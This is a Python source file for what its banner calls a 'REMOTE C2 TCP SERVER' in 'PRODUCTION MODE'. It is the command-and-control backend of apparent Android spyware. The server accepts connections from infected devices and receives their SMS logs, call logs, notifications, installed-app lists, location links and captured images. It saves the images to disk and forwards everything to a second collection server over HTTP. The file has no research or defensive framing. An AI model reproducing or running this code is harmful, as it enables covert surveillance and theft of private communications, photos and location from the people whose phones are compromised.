#!/usr/bin/env python3
import socket
import json
import threading
import base64
from datetime import datetime
import time
import logging
import sys
import os
from colorama import init, Fore, Style
import signal
import requests

# --- Konfigurasi dari Environment Variable ---
TCP_PORT = int(os.environ.get('TCP_PORT', 9090))
SERVER2_URL = os.environ.get('SERVER2_URL', '').rstrip('/')
HOST = '0.0.0.0'

# --- Globals ---
client_socket = None
client_address = None
running = True
connected_devices = {}

# --- Setup ---
init(autoreset=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Buat direktori jika belum ada
for dir_name in ['captured_images', 'device_downloads', 'screen_recordings', 'gallery_downloads']:
    if not os.path.exists(dir_name):
        os.makedirs(dir_name)

print(Fore.CYAN + "=" * 80)
print(Fore.CYAN + "     REMOTE C2 TCP SERVER (SERVER1) - PRODUCTION MODE")
print(Fore.CYAN + f"     Listening on port {TCP_PORT}")
if SERVER2_URL:
    print(Fore.GREEN + f"     Forwarding to server2: {SERVER2_URL}")
print(Fore.CYAN + "=" * 80)

# --- Fungsi untuk kirim data ke server2 ---
def forward_to_server2(data_type, payload):
    """Mengirim data ke Flask server (server2.py)"""
    if not SERVER2_URL or not client_address:
        return
    
    try:
        data_to_send = {
            'type': data_type,
            'payload': payload,
            'client_info': {
                'address': client_address[0],
                'timestamp': datetime.now().isoformat()
            }
        }
        
        def send_request():
            try:
                requests.post(f"{SERVER2_URL}/api/data", json=data_to_send, timeout=2)
            except:
                pass
        
        threading.Thread(target=send_request, daemon=True).start()
    except:
        pass

# --- Data Handlers ---
def handle_device_info(info):
    logger.info(f"Device connected: {info.get('Model', 'Unknown')}")
    forward_to_server2('DEVICE_INFO', info)

def handle_sms(log):
    logger.info(f"SMS from {log.get('userSender', 'N/A')}")
    forward_to_server2('SMS_LOG', {'log': log})

def handle_call(log):
    logger.info(f"Call from {log.get('number', 'N/A')}")
    forward_to_server2('CALL_LOG', {'log': log})

def handle_image(image_data):
    try:
        filename = image_data.get('filename', f"img_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
        filepath = os.path.join('captured_images', filename)
        
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(image_data.get('image_base64', '')))
        
        logger.info(f"Image saved: {filename}")
        forward_to_server2('IMAGE_DATA', {'image': image_data})
    except Exception as e:
        logger.error(f"Failed to save image: {e}")

def handle_app_list(log_data):
    apps = log_data.get('apps', [])
    logger.info(f"Received {len(apps)} apps")
    forward_to_server2('APP_LIST', log_data)

def handle_location(payload):
    url = payload.get('url')
    logger.info(f"Location: {url}")
    forward_to_server2('LOCATION_SUCCESS', {'url': url})

def handle_notification(notif):
    logger.info(f"Notification from {notif.get('packageName', 'N/A')}")
    forward_to_server2('NOTIFICATION_DATA', {'notification': notif})

def handle_incoming_data(data):
    try:
        payload = json.loads(data).get('data', {})
        log_type = payload.get('type', 'UNKNOWN')
        
        if log_type == 'DEVICE_INFO':
            handle_device_info(payload.get('info'))
        elif log_type == 'SMS_LOG':
            handle_sms(payload.get('log'))
        elif log_type == 'CALL_LOG':
            handle_call(payload.get('log'))
        elif log_type == 'IMAGE_DATA':
            handle_image(payload.get('image'))
        elif log_type == 'APP_LIST':
            handle_app_list(payload)
        elif log_type == 'LOCATION_SUCCESS':
            handle_location(payload)
        elif log_type == 'NOTIFICATION_DATA':
            handle_notification(payload.get('notification'))
        else:
            logger.info(f"Received: {log_type}")
            forward_to_server2(log_type, payload)
            
    except Exception as e:
        logger.error(f"Error handling data: {e}")

# --- Client Listener ---
def client_listener(sock):
    buffer = ""
    while running and sock:
        try:
            data = sock.recv(16384).decode('utf-8', errors='ignore')
            if not data:
                break
            buffer += data
            while '\n' in buffer:
                line, buffer = buffer.split('\n', 1)
                if line.strip():
                    handle_incoming_data(line.strip())
        except Exception as e:
            logger.error(f"Listener error: {e}")
            break
    
    logger.info("Client disconnected")
    global client_socket
    client_socket = None

# --- Main ---
def main():
    global client_socket, client_address, running
    
    def signal_handler(sig, frame):
        global running
        running = False
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((HOST, TCP_PORT))
        server_socket.listen(5)
        logger.info(f"Server ready on port {TCP_PORT}")
        
        while running:
            try:
                server_socket.settimeout(1.0)
                conn, addr = server_socket.accept()
                conn.settimeout(5.0)
                client_socket, client_address = conn, addr
                
                print(f"\n{Fore.GREEN}[+] Device connected from {addr[0]}:{addr[1]}{Style.RESET_ALL}")
                logger.info(f"Device connected from {addr[0]}:{addr[1]}")
                
                forward_to_server2('CONNECTION', {
                    'status': 'connected',
                    'address': addr[0]
                })
                
                threading.Thread(target=client_listener, args=(conn,), daemon=True).start()
                
            except socket.timeout:
                continue
            except Exception as e:
                logger.error(f"Accept error: {e}")
                time.sleep(1)
        
    except Exception as e:
        logger.error(f"Server error: {e}")
    finally:
        server_socket.close()
        logger.info("Server stopped")

if __name__ == '__main__':
    main()
